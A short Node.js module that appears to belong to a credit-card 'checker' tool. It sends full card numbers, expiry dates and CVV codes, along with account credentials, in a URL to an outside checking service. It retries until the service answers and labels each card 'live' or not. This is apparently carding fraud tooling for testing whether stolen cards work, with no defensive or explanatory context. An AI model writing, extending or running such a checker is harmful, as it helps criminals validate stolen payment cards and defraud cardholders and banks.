const { getConfig } = require('../../configManager')
const request = require('request-promise')

module.exports = async function dbf(card, currentRetrys = 0) {
  const { retrys, dbf: configs } = getConfig('checkers')

  try {
    const options = {
      url: `https://dbfcheckers.tech/api/testadores/ap1v2?usuario=${configs.user}&senha=${configs.pass}&numero=${card.number}&mes=${card.month}&ano=${card.year}&csc=${card.cvv}`,
      method: 'get',
      timeout: 100000,
    }

    if (currentRetrys >= parseInt(retrys))
      return {
        active: true,
        skip: true,
        output: 'Error on call api',
      }

    const response = await request(options)
    const result = JSON.parse(response)

    if (!result.testado) {
      currentRetrys++
      return dbf(card, currentRetrys)
    }

    if (result?.aprovado) {
      return {
        live: true,
        active: true,
        output: response,
      }
    } else if (!result.aprovado) {
      return {
        live: false,
        active: true,
        output: response,
      }
    } else {
      currentRetrys++
      return dbf(card, currentRetrys)
    }
  } catch (e) {
    console.log(e)
    currentRetrys++
    return dbf(card, currentRetrys)
  }
}
